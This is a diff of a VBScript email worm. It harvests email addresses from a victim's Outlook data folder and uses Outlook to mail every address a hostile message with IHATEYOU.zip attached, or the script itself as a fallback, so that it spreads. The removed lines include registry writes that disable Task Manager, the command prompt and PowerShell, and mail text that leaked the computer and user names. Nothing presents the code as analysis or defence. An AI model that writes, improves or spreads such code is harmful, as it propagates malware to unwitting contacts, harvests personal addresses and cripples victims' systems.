@@ -8,7 +8,6 @@ Dim objFSO
 Dim objShell
 Dim objLogFile
 Dim objWshShell
-Dim objFolderItem
 Dim strSearchPath
 Dim strReport
 Dim intEmailCount
@@ -28,62 +27,38 @@ Dim altPath
 Dim strExt
 Dim folderNameStr
 Dim sentCount
-Dim intAttachmentCount
+Dim strZipPath
+Dim strScriptPath
+Dim strScriptName
+Dim strScriptFolder
 
-Set colFoundEmails = CreateObject("Scripting.Dictionary")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
 Set objWshShell = CreateObject("WScript.Shell")
 Set objRegEx = CreateObject("VBScript.RegExp")
+Set colFoundEmails = CreateObject("Scripting.Dictionary")
 
 objRegEx.Global = True
 objRegEx.IgnoreCase = True
 objRegEx.Pattern = "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
 
-'You can remove the notes but the script didnt worked with it.
-
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", "1", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Background", "0 0 0", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Window", "0 0 0", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\WindowText", "0 255 0", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Menu", "0 255 0", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\MenuText", "255 255 255", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonFace", "0 255 0", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonText", "255 255 255", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Highlight", "0 255 255", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HighlightText", "0 0 0", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HotTrackingColor", "0 255 255", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\GrayText", "255 255 0", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ActiveTitle", "0 255 255", "REG_SZ"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideShutDown", "1", "REG_DWORD"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoUserNameInStartMenu", "1", "REG_DWORD"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", "1", "REG_DWORD"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", "2", "REG_DWORD"
-'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\PowerShell\DisablePowerShell", "1", "REG_DWORD"
+strScriptPath = WScript.ScriptFullName
+strScriptName = objFSO.GetFileName(strScriptPath)
+strScriptFolder = objFSO.GetParentFolderName(strScriptPath)
+strZipPath = strScriptFolder & "\IHATEYOU.zip"
 
 Dim EMAIL_BODY
 EMAIL_BODY = "I hate you." & vbCrLf & _
              "Dont talk to me ever again." & vbCrLf & _
-             "Why me?." & vbCrLf & vbCrLf & _
-             "System: " & objWshShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
-             "User: " & objWshShell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
-             "Timestamp: " & Now() & vbCrLf & vbCrLf & _
-             "Asshole..." & vbCrLf
-
-Dim ATTACHMENT_PATH
-ATTACHMENT_PATH = WScript.ScriptFullName
+             "Why me?" & vbCrLf & vbCrLf
 
 Dim REPORT_PATH
 REPORT_PATH = "C:\temp\email_scan_results.txt"
 
 intEmailCount = 0
 intFolderCount = 0
-intAttachmentCount = 0
 sentCount = 0
 strReport = ""
-
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objShell = CreateObject("WScript.Shell")
 
 If Not objFSO.FolderExists("C:\temp") Then
     objFSO.CreateFolder("C:\temp")
@@ -94,9 +69,6 @@ strReport = strReport & "SCANNING" & vbCrLf
 strReport = strReport & "============================================" & vbCrLf
 strReport = strReport & "Timestamp: " & Now() & vbCrLf
 strReport = strReport & "============================================" & vbCrLf & vbCrLf
-
-strReport = strReport & "Validating" & vbCrLf
-strReport = strReport & "------------------------" & vbCrLf
 
 strSearchPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Outlook"
 strReport = strReport & "Scanning: " & strSearchPath & vbCrLf
@@ -137,96 +109,80 @@ If colFoundEmails.Count = 0 Then
     strReport = strReport & "No useable data collected" & vbCrLf
 End If
 
-strReport = strReport & "Analysis" & vbCrLf
-strReport = strReport & "-----------------------------" & vbCrLf
-
 On Error Resume Next
 Set objOutlook = GetObject(, "Outlook.Application")
+On Error GoTo 0
 
-If objOutlook Is Nothing Then
-    Set objOutlook = CreateObject("Outlook.Application")
-    If Err.Number <> 0 Then
-        strReport = strReport & "Cannot access Outlook" & vbCrLf
-    End If
+If Not objOutlook Is Nothing Then
+    Set objNamespace = objOutlook.GetNamespace("MAPI")
+    objNamespace.Logon
+
+    arrFolders = Array( _
+        "DeletedItems", _
+        "Outbox", _
+        "SentItems", _
+        "Inbox", _
+        "Calendar", _
+        "Contacts", _
+        "Journal", _
+        "Notes", _
+        "Tasks", _
+        "Drafts" _
+    )
+
+    For i = LBound(arrFolders) To UBound(arrFolders)
+        folderNameStr = arrFolders(i)
+        Set objFolder = Nothing
+        Set objFolder = objNamespace.GetDefaultFolder(GetFolderID(folderNameStr))
+        
+        If Not objFolder Is Nothing Then
+            intFolderCount = intFolderCount + 1
+            strReport = strReport & "  [FOLDER] " & folderNameStr & vbCrLf
+            strReport = strReport & "    Items: " & objFolder.Items.Count & vbCrLf
+            strReport = strReport & "    Unread: " & objFolder.UnReadItemCount & vbCrLf
+            strReport = strReport & vbCrLf
+        End If
+    Next
+
+    For Each strEmail In colFoundEmails.Keys
+        On Error Resume Next
+        Set objMailItem = objOutlook.CreateItem(0)
+        
+        If Not objMailItem Is Nothing Then
+            objMailItem.To = strEmail
+            objMailItem.Subject = "Email from: " & strEmail
+            objMailItem.Body = EMAIL_BODY
+            
+            If objFSO.FileExists(strZipPath) Then
+                objMailItem.Attachments.Add strZipPath
+                strReport = strReport & "ZIP attachment added for: " & strEmail & vbCrLf
+            Else
+                strReport = strReport & "ZIP file not found: " & strZipPath & " for " & strEmail & vbCrLf
+                objMailItem.Attachments.Add strScriptPath
+                strReport = strReport & "Script attached directly for: " & strEmail & vbCrLf
+            End If
+            
+            objMailItem.Send
+            
+            If Err.Number = 0 Then
+                sentCount = sentCount + 1
+                strReport = strReport & "Email sent to: " & strEmail & vbCrLf
+            Else
+                strReport = strReport & "Failed to send to: " & strEmail & " - Error: " & Err.Description & vbCrLf
+            End If
+            
+            WScript.Sleep 1500
+        Else
+            strReport = strReport & "Could not create email for: " & strEmail & vbCrLf
+        End If
+        On Error GoTo 0
+    Next
+Else
+    strReport = strReport & "Cannot access Outlook" & vbCrLf
 End If
-On Error GoTo 0
-
-Set objNamespace = objOutlook.GetNamespace("MAPI")
-objNamespace.Logon
-
-strReport = strReport & "Success" & vbCrLf
-
-arrFolders = Array( _
-    "DeletedItems", _
-    "Outbox", _
-    "SentItems", _
-    "Inbox", _
-    "Calendar", _
-    "Contacts", _
-    "Journal", _
-    "Notes", _
-    "Tasks", _
-    "Drafts" _
-)
-
-For i = LBound(arrFolders) To UBound(arrFolders)
-    folderNameStr = arrFolders(i)
-    
-    On Error Resume Next
-    Set objFolder = Nothing
-    Set objFolder = objNamespace.GetDefaultFolder(GetFolderID(folderNameStr))
-    On Error GoTo 0
-    
-    If Not objFolder Is Nothing Then
-        intFolderCount = intFolderCount + 1
-        strReport = strReport & "  [FOLDER] " & folderNameStr & vbCrLf
-        strReport = strReport & "    Items: " & objFolder.Items.Count & vbCrLf
-        strReport = strReport & "    Unread: " & objFolder.UnReadItemCount & vbCrLf
-        strReport = strReport & vbCrLf
-    End If
-Next
-
-strReport = strReport & "Finalising" & vbCrLf
-strReport = strReport & "--------------------------" & vbCrLf
-
-For Each strEmail In colFoundEmails.Keys
-    On Error Resume Next
-    Set objMailItem = objOutlook.CreateItem(0)
-    
-    If Not objMailItem Is Nothing Then
-        objMailItem.To = strEmail
-        objMailItem.Subject = "Email from: " & strEmail
-        objMailItem.Body = EMAIL_BODY
-        
-        If objFSO.FileExists(ATTACHMENT_PATH) Then
-            objMailItem.Attachments.Add ATTACHMENT_PATH
-            strReport = strReport & "Attachment added for: " & strEmail & vbCrLf
-        Else
-            strReport = strReport & "Attachment not found for: " & strEmail & vbCrLf
-        End If
-        
-        objMailItem.Send
-        
-        If Err.Number = 0 Then
-            sentCount = sentCount + 1
-            strReport = strReport & "Email sent to: " & strEmail & vbCrLf
-        Else
-            strReport = strReport & "Failed to send to: " & strEmail & " - Error: " & Err.Description & vbCrLf
-        End If
-        
-        WScript.Sleep 1500
-    Else
-        strReport = strReport & "Could not create email for: " & strEmail & vbCrLf
-    End If
-    On Error GoTo 0
-Next
-
-On Error GoTo 0
 
 strReport = strReport & vbCrLf
 strReport = strReport & "Total emails sent: " & sentCount & vbCrLf
-
-strReport = strReport & "Proceeding.."
 strReport = strReport & "============================================" & vbCrLf
 strReport = strReport & "COMPLETED" & vbCrLf
 strReport = strReport & "============================================" & vbCrLf
@@ -320,7 +276,6 @@ Sub ScanFolderRecursive(folderPath)
 End Sub
 
 Set objMailItem = Nothing
-Set objFolderItem = Nothing
 Set objFolder = Nothing
 Set objNamespace = Nothing
 Set objOutlook = Nothing
